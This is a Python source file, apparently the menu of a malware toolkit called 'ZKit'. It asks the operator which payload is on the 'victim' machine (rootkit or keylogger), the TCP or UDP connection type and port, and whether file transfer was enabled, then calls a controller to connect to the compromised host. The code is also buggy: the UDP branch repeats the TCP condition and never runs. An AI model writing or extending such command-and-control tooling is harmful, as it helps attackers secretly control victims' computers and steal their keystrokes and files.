def main():
    import os
    import core.lib._controllers.rootkit_controller as ctrl
    from core.helper_core import Color, notify
    if os.name == 'nt':
        from colorama import init 
        init(convert = True)
    black, red, green, yellow, blue, magenta, cyan, grey, reset = Color().GetAllColors()
    print("What Is The Victims PayLoad ?\n"
          + red + "{1}--> Rootkit\n"
          + green + "{2}--> KeyLogger*\n"
          + blue + "{000}--> Back To Main Menu\n" + reset)
    CHOICE = str(input("..> "))
    if CHOICE == "000":
        pass
    elif CHOICE == "1":
        print("At The Time Of Creation Of Rootkit . ZKit Asked About A Connection Type "
              "What Was It ?\n"
              + red + "{1}--> TCP\n"
              + green + "{2}--> UDP\n"
              + blue + "{000}--> Back To Main Menu" + reset)
        CHOICE = str(input("..> "))
        notify("question" , "what port did you used ? left empty to use default (1534)")
        port = int(input("..> "))
        type = 'ft' if input("Was the payload enchanted with file transfer (Y or N)").lower() == 'y' else 'rootkit'
        if CHOICE == "000":
            pass
        elif CHOICE == "1":
            ctrl.connect("TCP", port, type)
        elif CHOICE == "1":
            ctrl.connect("UDP", port, type)
    else:
        notify("notify",
              "Invalid Input {" + "{}".format(CHOICE) + "}")